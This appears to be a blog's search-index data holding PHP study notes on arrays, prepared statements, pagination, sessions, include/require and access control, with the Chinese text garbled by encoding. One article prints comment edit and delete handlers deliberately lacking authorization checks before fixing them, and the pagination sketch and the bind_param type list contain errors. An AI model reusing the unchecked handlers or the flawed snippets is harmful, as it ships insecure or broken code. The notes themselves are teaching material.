åˆ°æœ€å¾Œé¢ 1234$my_array = array(1, 2, 3, 4);array_push($my_array, 5);print_r($my_array);// Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 ) è£¡é¢ä¹Ÿå¯ä»¥ push å­—ä¸²ã€é™£åˆ—æˆ–ç‰©ä»¶çš„è³‡æ–™ï¼Œå°±è·Ÿ JS ä¸€æ¨£ã€‚ array_unshift($array, $value) æ–°å¢å…ƒç´ åˆ°æœ€å‰é¢ 1234$my_array = array(1, 2, 3, 4);array_unshift($my_array, 0);// Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 )print_r($my_array); array_pop($array) åˆªé™¤æœ€å¾Œä¸€å€‹å…ƒç´  1234$my_array = array(1, 2, 3, 4);array_pop($my_array);// Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 )print_r($my_array); array_shift($array) åˆªé™¤ç¬¬ä¸€å€‹å…ƒç´  1234$my_array = array(1, 2, 3, 4);array_shift($my_array);// Array ( [0] =&gt; 2 [1] =&gt; 3 [2] =&gt; 4 )print_r($my_array); array_map($callback, $array) è·Ÿ JS çš„ Array.map() ä¸€æ¨£ï¼Œä¸éè¦æ³¨æ„ PHP ä¸èƒ½åƒ JS ä¸€æ¨£æŠŠ function ç•¶åƒæ•¸å‚³ï¼Œæ‰€ä»¥å¯«æ³•ä¸å¤ªä¸€æ¨£ï¼š 123456789// å…ˆå®šç¾©å¥½ functionfunction callback($item) { return $item * 2;}$my_array = array(1, 2, 3, 4);// ç”¨å­—ä¸²è¡¨ç¤ºåŸ·è¡Œå“ªå€‹ function$result = array_map('callback', $my_array);// Array ( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 6 [3] =&gt; 8 )print_r($result); é¿å… SQL Injection çš„æ–¹æ³•è¦æ”¹ç”¨ Prepared Statements çš„æ–¹å¼ä¾†ä¸‹ SQLï¼š 123456789101112131415// login.php&lt;?php // å…ˆæº–å‚™å¥½ sqlï¼Œåƒæ•¸çš„éƒ¨åˆ†æ”¹ç”¨ ? é€™å€‹ placeholder ä¾†ä»£æ›¿ $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES (?, ?)\"; // æ¥è‘—æŠŠ sql æŒ‡ä»¤ä¸Ÿåˆ° prepare()ï¼Œé€²å…¥æº–å‚™éšæ®µ $stmt = $conn-&gt;prepare($sql); // æ¥è‘—æŠŠå€¼åšç¶å®šï¼ˆç¶å®šéšæ®µï¼‰ï¼Œ'ss' æ˜¯ä»£è¡¨å…©å€‹åƒæ•¸éƒ½æ˜¯ string $stmt-&gt;bind_param('ss', $nickname, $content); // åˆ°é€™é‚Šæ‰æ˜¯çœŸçš„åŸ·è¡Œ sql $result = $stmt-&gt;execute(); // å¦‚æœè¦æ‹¿å‡ºæ¬„ä½çš„è³‡ï¼Œè¨˜å¾—åŠ ä¸Šé€™ä¸€å¥ $result = $stmt-&gt;get_result(); // é€™æ¨£é€™é‚Šæ‰æ‹¿çš„åˆ° $row = $result-&gt;fetch_assoc();?&gt; bind_param() æœ‰å››ç¨®å‹åˆ¥ï¼š iï¼ˆintegerï¼‰ d ï¼ˆdoubleï¼‰ sï¼ˆstringï¼‰ b ï¼ˆBooleanï¼‰ å…§å»ºè®Šæ•¸ $_GET['id'] å–å¾— GET çš„ id å€¼ $_POST['id'] å–å¾— POST çš„ id å€¼ $_SESSION['username'] SESSION ä¸­ usernameï¼ˆè®€å–æˆ–è¨­å®šï¼‰ $_SERVER['REQUEST_URI'] å–å¾—è·¯å¾‘ï¼ˆDomain ä¸‹çš„è·¯å¾‘ï¼‰ $_SERVER['HTTP_HOST'] å–å¾—åŸŸåï¼ˆä¸»æ©Ÿåç¨±ï¼‰ $_COOKIE['username'] å–å¾— COOKIE ä¸­çš„ username","link":"/2022/01/31/php-built-in-function/"},{"title":"PHP ç•¶ POST çš„è³‡æ–™æ ¼å¼ç‚º JSON æ™‚","text":"ç­†è¨˜èµ·ä¾†ã€‚ ç°¡è¿°ä¸€èˆ¬å¦‚æœæ˜¯ç”¨è¡¨å–® POST åˆ°å¾Œç«¯æ™‚ï¼Œå¾Œç«¯å¯ä»¥ç”¨ $_POST ä¾†å–å¾—è³‡æ–™ã€‚ä½†æ˜¯ç•¶å‰ç«¯ä¸æ˜¯å‚³çš„ Content-type æ˜¯ text/xmlã€application/xmlã€application/json ä¹‹é¡çš„è©±ï¼Œ$_POST å°±æ‹¿ä¸åˆ°ã€‚ æ‰€ä»¥é€™æ™‚å€™è¦æ”¹ç”¨ file_get_content æ­é… php://input ä¾†å–å¾—ã€‚php://input æ˜¯ç”¨ä¾†è®€å– request body çš„å…§å®¹ã€‚ ç¸½ä¹‹å‘¢ï¼Œå¾Œç«¯å¤§æ¦‚æœƒé€™æ¨£å¯«ï¼š 1$data = file_get_contents('php://input'); é€™æ¨£å°±èƒ½é †åˆ©æ‹¿åˆ° JSON æ ¼å¼çš„è³‡æ–™äº†ï¼","link":"/2022/02/27/php-file-get-contents/"},{"title":"PHP å¦‚ä½•å–å¾—æœ€æ–°ä¸€ç­†çš„è³‡æ–™ idï¼Ÿ","text":"å…¶å¯¦æ–¹æ³•é‚„è »å¤šç¨®çš„ï¼Œæ‰€ä»¥ç‰¹åˆ¥è¨˜ä¸€ä¸‹ã€‚ å„ç¨®æ–¹æ³• åˆ©ç”¨ MAX() å‡½å¼ï¼š 1SELECT MAX(id) AS id FROM todos; åˆ©ç”¨ ORDER BY å’Œ LIMITï¼š 1SELECT todos.id FROM todos ORDER BY id DESC LIMIT 1; åˆ©ç”¨ $conn-&gt;insert_idï¼š 1234567$name = 'PeaNu';$sql = \"INSERT INTO users(name) VALUES(?)\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('s', $name);$stmt-&gt;execute();// é€™é‚Šæœƒè‡ªå‹•å»æŠ“ä¸Šä¸€ç­† auto_increment ç”¢ç”Ÿçš„ id å€¼echo 'ä¸Šä¸€ç­†æ–°å¢çš„ id å€¼ç‚º' . $conn-&gt;insert_id; ä»¥ä¸Šï¼Œç¬¬ä¸‰ç¨®æ‡‰è©²æœƒæ˜¯æœ€ç°¡å–®çš„æ–¹å¼ã€‚","link":"/2022/03/08/php-get-newest-id/"},{"title":"ç”¨ PHP å¯¦ä½œåˆ†é åŠŸèƒ½","text":"ç°¡å–®è¨˜éŒ„ä¸€ä¸‹ã€‚ ç°¡è¿°åŸºæœ¬çš„åˆ†é åŠŸèƒ½æœ‰å¹¾å€‹è¦ç´ ï¼š ç›®å‰é æ•¸ ç¸½é æ•¸ ä¸€é è¦é¡¯ç¤ºå¹¾ç­†è³‡æ–™ åªè¦æŒæ¡é€™äº›åŸå‰‡å°±èƒ½åšå‡ºä¸€å€‹å¾ˆç°¡å–®çš„åˆ†é åŠŸèƒ½ï¼Œä¸éåœ¨é‚£ä¹‹å‰è¦å…ˆçŸ¥é“æ€éº¼å¾è³‡æ–™åº«è£¡é¢æ’ˆå‡ºæ­£ç¢ºçš„è³‡æ–™ã€‚ SQL æŒ‡ä»¤æœ‰å€‹é—œéµå­—æ˜¯ LIMIT è·Ÿ OFFSETï¼Œå‰è€…ä»£è¡¨ã€Œé¡¯ç¤ºå¹¾ç­†ã€å¾Œè€…ä»£è¡¨ã€Œç•¥éå¹¾ç­†ã€ã€‚ä¸éæœ‰éƒ¨åˆ†çš„è³‡æ–™åº«æ˜¯ç”¨ LIMIT å’Œ é€—è™Ÿ ä¾†è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š 1234-- 0 ~ 4 çš„è³‡æ–™SELECT * FROM comments LIMIT 5;-- åŒæ¨£æ˜¯ 0 ~ 4ï¼ˆç•¥é 0 ç­†ï¼Œé¡¯ç¤º 5 ç­†ï¼‰SELECT * FROM comments LIMIT 0, 5; ä½†æœ‰äº›è³‡æ–™åªæ”¯æ´ OFFSET çš„å¯«æ³•ï¼Œæ‰€ä»¥å¾—é€™æ¨£ä½¿ç”¨ï¼š 1234-- 0 ~ 4 çš„è³‡æ–™SELECT * FROM comments LIMIT 5 OFFSET 0;-- 5 ~ 10 çš„è³‡æ–™SELECT * FROM comments LIMIT 5 OFFSET 5; ç¸½ä¹‹å‘¢ï¼Œå¾ä¸Šé¢å¯ä»¥çœ‹å‡º LIMIT æ˜¯å›ºå®šçš„ï¼Œåªè¦ä¸åœåœ°æ›´æ–° OFFSET å°±èƒ½ç”¢å‡ºé€™æ¨£çš„è¦å¾‹ï¼š OFFSET = 0ï¼Œé¡¯ç¤º 0 ~ 4 çš„è³‡æ–™ OFFSET = 5ï¼Œé¡¯ç¤º 5 ~ 10 çš„è³‡æ–™ OFFSET = 10ï¼Œé¡¯ç¤º 11 ~ 15 çš„è³‡æ–™ OFFSET = 15ï¼Œé¡¯ç¤º 15 ~ 20 çš„è³‡æ–™ é€™æ¨£å°±æœ‰åˆ†é æ•ˆæœäº†ã€‚ æ­£å¼å¯¦ä½œé€™é‚Šæ‹¿ç•™è¨€æ¿ä¾†èˆ‰ä¾‹ï¼Œé¦–å…ˆå¾—åœ¨é¦–é å®£å‘Šä¸€äº›è®Šæ•¸ä¾†å„²å­˜åˆ†é è³‡è¨Šï¼š page ç›®å‰é æ•¸ per_page ä¸€é é¡¯ç¤ºå¹¾ç­†è³‡æ–™ offset ç•¥éå¹¾ç­†è³‡æ–™ï¼Œç”¨ä¾†æ§åˆ¶é æ•¸ total_page ç¸½å…±æœ‰å¹¾é ï¼Œç”¨ä¾†æ§åˆ¶ä¸Šé™å€¼ ç‰¹åˆ¥è§£é‡‹ä¸€ä¸‹ offset çš„éƒ¨åˆ†ï¼Œé€™éœ€è¦ç”¨åˆ°åœ‹å°æ•¸å­¸ä¾†è¨­å®šï¼š 1$offset = ($page-1) * $per_page; å‡è¨­ $page çš„åˆå§‹å€¼ç‚º 1ï¼Œæ„æ€æ˜¯åœ¨ç¬¬ä¸€é çš„æ™‚å€™è¦ç•¥é 0 ç­†è³‡æ–™ï¼ˆ0 x 5 = 0ï¼‰ï¼Œç¬¬äºŒé çš„æ™‚å€™è¦ç•¥é 5 ç­†è³‡æ–™ï¼ˆ 1 x 5ï¼‰ï¼Œä»¥æ­¤é¡æ¨ï¼Œæ¥è‘—åªè¦æ›´æ–° $pageï¼Œoffset å°±æœƒè·Ÿè‘—æ”¹è®Šï¼Œé€™æ¨£å°±å®Œæˆäº†åˆ†é é‚è¼¯ã€‚ æ¥è‘—åªè¦æ­é… &lt;a href=\"index.php?page=1\"&gt; å¸¶ä¸Š $_GET['page'] çš„æ–¹å¼ä¾†æ§åˆ¶åˆ†é ç‹€æ…‹ï¼ˆå°±åƒ errorCode ä¸€æ¨£ï¼‰ï¼Œå°±å¯ä»¥æ ¹æ“šåƒæ•¸å€¼ä¾†æ±ºå®šç¾åœ¨è¦é¡¯ç¤ºå“ªäº›è³‡æ–™ã€‚ æœ€å¾Œç°¡å–®ç¤ºç¯„ä¸€ä¸‹ï¼Œå…¶å¯¦å°±æ˜¯æŠŠä¸Šé¢å…¨éƒ¨çµ„åˆèµ·ä¾†è€Œå·²ï¼š ï¼ˆé€™é‚Šåªæ˜¯å¯«å€‹æ¦‚å¿µï¼Œçœ‹çš„æ‡‚å°±å¥½ï¼‰ 123456789101112131415161718&lt;?php // ä¸€é é¡¯ç¤º 10 ç­† $per_page = 10; // é è¨­ç¬¬ä¸€é  $page = 1; // å»è³‡æ–™åº«æ’ˆå‡ºç¸½å…±æœ‰å¹¾ç­†è³‡æ–™ $total_count = $conn-&gt;query(\"SELECT COUNT(comments.id) AS total FROM comments\"); /* ç„¡æ¢ä»¶é€²ä½ï¼Œå‡è¨­æœ‰ 11 ç­†è³‡æ–™ï¼Œceil(11 / 10) = 2ï¼Œå¾—åˆ°å…©é  å¦‚æœç”¨ç„¡æ¢ä»¶æ¨å»ï¼Œfloor(11 / 10) = 1ï¼Œé€™æ¨£å°±åªæœ‰ä¸€é ï¼Œæœ€å¾Œé‚£ç­†è¢«å¿½ç•¥æ‰äº†ã€‚ */ $total_pages = ceil($total_count / $per_page) // ç®—å‡º offsetï¼Œæ±ºå®šç­‰ä¸‹çš„ SQL æ€éº¼ä¸‹ $offset = ($page-1) * $per_page; // æœ€å¾Œå°±å¯ä»¥å»æ’ˆè³‡æ–™äº† $comments = $conn-&gt;query(\"SELECT * FROM comments LIMIT $per_page OFFSET $offset\"); ?&gt; æœ€å¾ŒåŠ ä¸Šæ§åˆ¶ç”¨çš„æŒ‰éˆ•å°± OK äº†ï¼š 1234&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo 1; ?&gt;\"&gt;é¦–é &lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $page - 1;?&gt;\"&gt;ä¸Šä¸€é &lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $page + 1;?&gt;\"&gt;ä¸‹ä¸€é &lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $total_page; ?&gt;\"&gt;æœ€å¾Œä¸€é &lt;/a&gt; ä»¥ä¸Šï½","link":"/2022/02/15/php-pagination-system/"},{"title":"å¾ PHP å­¸ç¿’æ¬Šé™ç®¡ç†çš„é‡è¦æ€§","text":"è³‡è¨Šå®‰å…¨ä¸å¯ç–å¿½ã€‚ ç°¡è¿°é€™è£¡æƒ³å¼·èª¿ã€Œçœ‹ä¸åˆ°ä¸ä»£è¡¨æ‘¸ä¸åˆ°ã€çš„æ¦‚å¿µã€‚åœ¨å¯¦ä½œç·¨è¼¯èˆ‡åˆªé™¤ç•™è¨€æ™‚ï¼Œç‚ºäº†ç®¡ç†æ¬Šé™ï¼Œæˆ‘å€‘åœ¨æ¸²æŸ“ç•«é¢çš„æ™‚å€™å¤šåŠ ä¸€å€‹åˆ¤æ–·æ˜¯åªæœ‰è‡ªå·±çš„ç•™è¨€æ‰æœƒé¡¯ç¤ºç·¨è¼¯è·Ÿåˆªé™¤çš„æŒ‰éˆ•ï¼Œåƒé€™æ¨£ï¼š ç«å±±çŸ½è‚ºç—…åªæœ‰åœ¨è‡ªå·±ç™»å…¥å¾Œæ‰å¯ä»¥ç·¨è¼¯æˆ–åˆªé™¤è‡ªå·±çš„ç•™è¨€ã€‚ é›–ç„¶ç•«é¢ä¸Šè¡¨é¢ä¸Šçœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œï¼Œä½†å…¶å¯¦é€™èƒŒå¾Œå­˜åœ¨ä¸€å€‹æ¼æ´ï¼Œç­‰ç­‰è®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚ ä½ æƒ³ä¸åˆ°çš„ç¥å±•é–‹é€™è£¡å°±ä¸è³£é—œå­äº†ï¼Œç›´æ¥è®“ä½ çœ‹æœ‰ä»€éº¼æ¼æ´ã€‚ åˆªé™¤åˆ¥äººçš„ç•™è¨€ï¼š ä¿®æ”¹åˆ¥äººçš„ç•™è¨€ï¼š ç™¼ç¾å•é¡Œç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿé€™å¾—çœ‹ä¸€ä¸‹æˆ‘å€‘æ˜¯æ€éº¼å¯¦ä½œç·¨è¼¯èˆ‡åˆªé™¤åŠŸèƒ½çš„ã€‚ ç·¨è¼¯ç•™è¨€ï¼š 1234567891011121314// handle_update_comment.php&lt;?php require_once('./conn.php'); // æ‹¿åˆ°è¦ä¿®æ”¹çš„ç•™è¨€ id $id= $_POST['id']; // ç•™è¨€çš„å…§å®¹ $content = $_POST['content']; // ä¸‹æŒ‡ä»¤æ›´æ–° id=? çš„ç•™è¨€å…§å®¹ $sql = \"UPDATE comments SET content=? WHERE id=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('si', $content, $id); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; åˆªé™¤ç•™è¨€ï¼š 123456789101112// hande_delete_comment.php&lt;?php require_once('./conn.php'); // æ‹¿åˆ°è¦åˆªé™¤çš„ç•™è¨€ id $id= $_GET['id']; // ä¸‹æŒ‡ä»¤æŠŠ id=? çš„ç•™è¨€åˆªæ‰ $sql = \"UPDATE comments SET is_deleted=1 WHERE id=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('i', $id); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; æ³¨æ„åˆ°å•é¡Œäº†å—ï¼Ÿé€™å…©æ®µç¨‹å¼å®Œå…¨æ²’æœ‰åšæ¬Šé™æª¢æŸ¥ã€‚ ç‚ºä»€éº¼ä¸€é–‹å§‹è¦å¼·èª¿ã€Œçœ‹ä¸åˆ°ä¸ä»£è¡¨æ‘¸ä¸åˆ°ã€ï¼Ÿå› ç‚ºé€™å°±æ˜¯å•é¡Œæ‰€åœ¨ï¼Œå°±ç®—æˆ‘è®“å‰ç«¯ç•«é¢çœ‹èµ·ä¾†ä¸èƒ½å‹•åˆ¥äººçš„ç•™è¨€ï¼Œä½†æˆ‘é‚„æ˜¯å¯ä»¥ç”¨ã€Œç¶²å€ã€ç™¼ä¸€å€‹ GET è«‹æ±‚åˆ°å¾Œç«¯ï¼Œè®“å¾Œç«¯åŸ·è¡Œå°æ‡‰æŒ‡ä»¤ã€‚ è§£æ±ºå•é¡Œæ‰€ä»¥æ­£ç¢ºçš„ä½œæ³•æ‡‰è©²æ˜¯å¾Œç«¯ä¹Ÿè¦åšæ¬Šé™æª¢æŸ¥ï¼Œæ—¢ç„¶å·²ç¶“æœ‰ç™»å…¥æ©Ÿåˆ¶ï¼Œé‚£åœ¨åšç·¨è¼¯ã€åˆªé™¤æˆ–æ–°å¢ç­‰ç­‰çš„è³‡æ–™æ™‚éƒ½æ‡‰è©²è¦åƒç™»å…¥ä¸€æ¨£ç”¨ session æ©Ÿåˆ¶ç¢ºä¿æ˜¯ä½¿ç”¨è€…æœ¬äººï¼Œæ‰å¯ä»¥åŸ·è¡Œå°æ‡‰è¡Œç‚ºã€‚ æ‰€ä»¥æŠŠå‰›å‰›çš„ç¨‹å¼ç¢¼ä¿®æ”¹ä¸€ä¸‹ã€‚ åˆªé™¤ç•™è¨€ï¼š 123456789101112131415// hande_delete_comment.php&lt;?php require_once('./conn.php'); // åŠ ä¸Š session æ©Ÿåˆ¶ session_start(); $id= $_GET['id']; $username = $_SESSION['username']; // åŠ ä¸Š AND ä¾†åˆ¤æ–· username æ˜¯å¦æ­£ç¢º $sql = \"UPDATE comments SET is_deleted=1 WHERE id=? AND username=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('is', $id, $username); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; ç·¨è¼¯ç•™è¨€ï¼š 12345678910111213141516&lt;?php require_once('./conn.php'); // åŠ ä¸Š session æ©Ÿåˆ¶ session_start(); $id= $_POST['id']; $content = $_POST['content']; $username = $_SESSION['username']; // åŠ ä¸Š AND ä¾†åˆ¤æ–· username æ˜¯å¦æ­£ç¢º $sql = \"UPDATE comments SET content=? WHERE id=? AND username=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('sis', $content, $id, $username); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; å¾Œè¨˜åœ¨åšå®Œé€™å€‹ case å¾Œé«”æœƒåˆ°åŸä¾†æœ‰äº›äº‹æƒ…ä¸æ˜¯ã€Œå–®é å‰ç«¯ã€å°±èƒ½è§£æ±ºçš„ã€‚åƒæ˜¯è¡¨å–®é©—è­‰ï¼Œå³ä¾¿å‰ç«¯å…ˆæª¢æŸ¥éå¾Œç«¯ä¹Ÿè¦å†æª¢æŸ¥ä¸€æ¬¡ã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºä½¿ç”¨è€…å¾ˆå¤šæ™‚å€™å¯ä»¥ç¹éå‰ç«¯çš„æª¢æŸ¥ï¼Œç›´æ¥å‘å¾Œç«¯ç™¼ requestï¼Œå¦‚æœé€™æ™‚å€™å¾Œç«¯æ²’æœ‰åšæª¢æŸ¥å‘¢ï¼Ÿé‚£å°±æŒ«å’§ä½†äº†ã€‚æ‰€ä»¥æ¯”èµ·å‰ç«¯ï¼Œå¾Œç«¯æ›´éœ€è¦å…·å‚™è³‡è¨Šå®‰å…¨çš„çŸ¥è­˜ï¼Œé€™ä¸€é»çœŸçš„å¾ˆé‡è¦ï¼Œå¾ˆé‡è¦ã€‚","link":"/2022/02/15/php-permission-problem/"},{"title":"å¦‚ä½• PHP æ­£ç¢ºçš„æ¸…é™¤ session","text":"ç¸½ç®—æ‰¾åˆ°è§£æ³•äº†ã€‚ ç°¡è¿°å…ˆä¾†çœ‹åŸæœ¬çš„åšæ³•ï¼š 12session_start();session_destroy(); é€™æ¨£å­ç¢ºå¯¦èƒ½æ¸…é™¤ server ç«¯çš„ session è³‡æ–™ï¼Œå¯æ˜¯ client ç«¯çš„ cookie é‚„æ˜¯æœƒä¿ç•™ã€‚ æ‰€ä»¥é€™é‚Šè¦æ•™ä½ æ€éº¼æŠŠ client ç«¯ä¹Ÿæ¸…ä¹¾æ·¨ã€‚ ç¯„ä¾‹æ‹¿ä¸€å€‹ç™»å…¥æ©Ÿåˆ¶ä¾†ç•¶ç¯„ä¾‹ï¼š å»ºç«‹ sessionï¼ˆç™»å…¥ï¼‰ 12345678910session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);session_start();$_SESSION['username'] = 'peanu'; åˆªé™¤ sessionï¼ˆç™»å‡ºï¼‰ 123456789101112131415session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);// é€™è£¡çš„åƒæ•¸æœƒæ˜¯å¾ä¸Šé¢çš„è¨­å®šä¾†æ‹¿çš„ï¼Œ// æ‰€ä»¥æœ€å¥½æ˜¯çµ±ä¸€è¨­ç‚ºä¸€æ¨£çš„ï¼Œæ‰ä¸æœƒå‡ºéŒ¯ã€‚$cookie_Info = session_get_cookie_params();session_start();// é€™ä¸€è¡Œå°±æ˜¯æŠŠ cookie æ¸…æ‰çš„é‡é»äº†setcookie(session_name(), '', time()-42000, $cookie_Info['path']);session_destroy(); ç¤ºç¯„ä¸€ä¸‹ï¼š ç¶“éæˆ‘å¤šæ¬¡æ¸¬è©¦å¾Œï¼Œå¾—å‡ºä¸€å€‹é‡é»ï¼š setcookie çš„ path åƒæ•¸ä¸€å®šè¦ä¸€æ¨£ï¼Œä¸ç„¶å°±æœƒåˆªä¸æ‰ã€‚ å†èªªä¸€æ¬¡ï¼Œåªè¦ path ä¸å°ï¼Œå°±ç®—å…¶ä»–éƒ½æ­£ç¢ºä¹Ÿåˆªä¸æ‰ï¼Œæ‰€ä»¥è¦ç‰¹åˆ¥æ³¨æ„ã€‚","link":"/2022/03/13/php-remove-session/"},{"title":"PHP require å’Œ include çš„å·®åˆ¥","text":"å¯«çµ¦è‡ªå·±çœ‹ã€‚ ç°¡è¿°åœ¨ç¶²è·¯ä¸Šçˆ¬äº†ä¸€äº›æ–‡ç« ç™¼ç¾å…§å®¹éƒ½æ˜¯éŒ¯çš„ï¼Œå…ˆé‡æ¸…å¹¾å€‹éŒ¯èª¤è§€å¿µ require ä¸èƒ½ç”¨è¿´åœˆ 12345678$i = 1;while ($i &lt;= 3) { require(\"./a_$i.php\"); $i++;}echo 'ç¬¬ä¸€æ”¯æª”æ¡ˆ' . $a_1 . '&lt;br&gt;';echo 'ç¬¬äºŒæ”¯æª”æ¡ˆ' . $a_2 . '&lt;br&gt;';echo 'ç¬¬ä¸‰æ”¯æª”æ¡ˆ' . $a_3 . '&lt;br&gt;'; å…¶å¯¦æ˜¯ OK çš„ï¼Œæˆ‘å¯¦æ¸¬çš„çµæœå¦‚ä¸‹ï¼š 123ç¬¬ä¸€æ”¯æª”æ¡ˆa_1ç¬¬äºŒæ”¯æª”æ¡ˆa_2ç¬¬ä¸‰æ”¯æª”æ¡ˆa_3 require ä¸èƒ½ç”¨ if else åšæµç¨‹åˆ¤æ–· 12345678$is_true = TRUE;if ($is_true) { require(\"./a_1.php\"); echo $a_1;} else { require(\"./a_2.php\"); echo $a_2;} é€™ä¸€æ¨£ä¹Ÿå¯ä»¥ï¼Œå¯¦æ¸¬çµæœï¼š 1a_1 çœŸæ­£çš„å·®åˆ¥çœŸæ­£çš„å·®åˆ¥åœ¨æ–¼ï¼Œå¦‚æœå»å¼•å…¥ä¸å­˜åœ¨çš„æª”æ¡ˆï¼Œinclude æœƒå™´ Warningï¼Œrequire æœƒå™´ Fatal errorã€‚è€Œ Waning è·Ÿ Fatal error çš„å·®åˆ¥æ˜¯æœƒä¸æœƒç¹¼çºŒå¾€ä¸‹åŸ·è¡Œç¨‹å¼ç¢¼ã€‚å‰è€…æœƒï¼Œå¾Œè€…ä¸æœƒï¼Œå°±é€™éº¼ç°¡å–®ã€‚ require ä¸å­˜åœ¨çš„æª”æ¡ˆ 12require('./a_12345.php'); // ä¸å­˜åœ¨çš„æª”æ¡ˆecho 'test'; è¼¸å‡ºçµæœï¼š 123Warning: require(./a_12345.php): Failed to open stream: No such file or directory in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4Fatal error: Uncaught Error: Failed opening required './a_12345.php' (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php:4 Stack trace: #0 {main} thrown in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4 include ä¸å­˜åœ¨çš„æª”æ¡ˆ 12include('./a_12345.php'); // ä¸å­˜åœ¨çš„æª”æ¡ˆecho 'test'; è¼¸å‡ºçµæœï¼š 1234Warning: include(./a_12345.php): Failed to open stream: No such file or directory in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4Warning: include(): Failed opening './a_12345.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4test // &lt;--- æœ‰å¾€ä¸‹åŸ·è¡Œ çœ¼å°–çš„è©±æœƒç™¼ç¾å…©å€‹éƒ½æ˜¯å…ˆå™´ Warningï¼Œæ¥è‘—æ‰æ±ºå®šè¦å™´ Warning é‚„æ˜¯ Fatal errorã€‚ é—œæ–¼é€™éƒ¨åˆ†ç¯€éŒ„ä¸€ä¸‹æ–‡ä»¶çš„è§£é‡‹ï¼š Files are included based on the file path given or, if none is given, the include_path specified. If the file isnâ€™t found in the include_path, include will finally check in the calling scriptâ€™s own directory and the current working directory before failing. The include construct will emit an E_WARNING if it cannot find a file; this is different behavior from require, which will emit an E_ERROR. Note that both include and require raise additional E_WARNINGs, if the file cannot be accessed, before raising the final E_WARNING or E_ERROR, respectively. æ„æ€æ‡‰è©²æ˜¯èªªä¸€é–‹å§‹æœƒå¾æˆ‘å€‘çµ¦çš„è·¯å¾‘è£¡å»æ‰¾æª”æ¡ˆï¼Œå¦‚æœæ‰¾ä¸åˆ°çš„è©± PHP æœƒå¾ include_path çµ¦çš„å€¼å»æ‰¾ï¼Œå¦‚æœé‚„æ˜¯æ‰¾ä¸åˆ°ï¼Œæœƒåˆ°ç›®å‰åŸ·è¡Œè…³æœ¬çš„è³‡æ–™å¤¾å†æ‰¾ä¸€æ¬¡ï¼Œå¦‚æœæœ€å¾Œæœ€å¾Œéƒ½é‚„æ˜¯æ‰¾ä¸åˆ°ï¼Œinclude å°±å™´ Warningï¼Œrequire å°±å™´ Fatal Errorã€‚ æ‰€ä»¥ä¸Šé¢çš„éŒ¯èª¤è¨Šæ¯æ‰æœƒæœ‰é€™ä¸€æ®µï¼š 1Failed opening './a_12345.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4 å¦å¤–å°±æ˜¯ä¸ç®¡æœ€å¾Œæ˜¯ Warning é‚„æ˜¯ Fatal Error åœ¨é‚£ä¹‹å‰éƒ½æœƒå…ˆå™´ä¸€å€‹ Warningï¼Œæ‰€ä»¥æ‰æœƒçœ‹åˆ°å…©å€‹éƒ½æœ‰ Warningã€‚ ç¸½çµä¾†èªªï¼Œå¦‚æœç¨‹å¼ä¸€å®šè¦ä¾è³´ require é€²ä¾†çš„æ±è¥¿ä¾†åŸ·è¡Œï¼Œæœ€å¥½æ˜¯ç”¨ requireï¼Œé€™æ¨£è®€æª”å¤±æ•—çš„æ™‚å€™å°±æœƒç›´æ¥åœæ­¢ï¼Œä½†å¦‚æœæ˜¯å¯æœ‰å¯ç„¡çš„è©±å°±èƒ½ç”¨ includeï¼Œä¾†ç¢ºä¿ç¨‹å¼ä¸æœƒè·‘åˆ°ä¸€åŠå°±è¢«ä¸­æ–·ã€‚ æœ‰æ²’æœ‰ once çš„å·®åˆ¥å°±æ˜¯æœƒä¸æœƒé‡è¤‡å¼•å…¥è€Œå·²ï¼Œä¾‹å¦‚èªªï¼š æ²’æœ‰ once 123456789101112// a_1.php&lt;?php $a_1 = 'a_1'; echo $a_1 . '&lt;br&gt;';?&gt;// main.php&lt;?php include('./a_1.php'); include('./a_1.php'); include('./a_1.php');?&gt; è¼¸å‡ºçµæœï¼š 123a_1a_1a_1 æœ‰ once 123456789101112// a_1.php&lt;?php $a_1 = 'a_1'; echo $a_1 . '&lt;br&gt;';?&gt;// main.php&lt;?php include_once('./a_1.php'); include_once('./a_1.php'); include_once('./a_1.php');?&gt; è¼¸å‡ºçµæœï¼š 1a_1","link":"/2022/02/22/php-require-and-include/"},{"title":"PHP å…§å»ºçš„ session 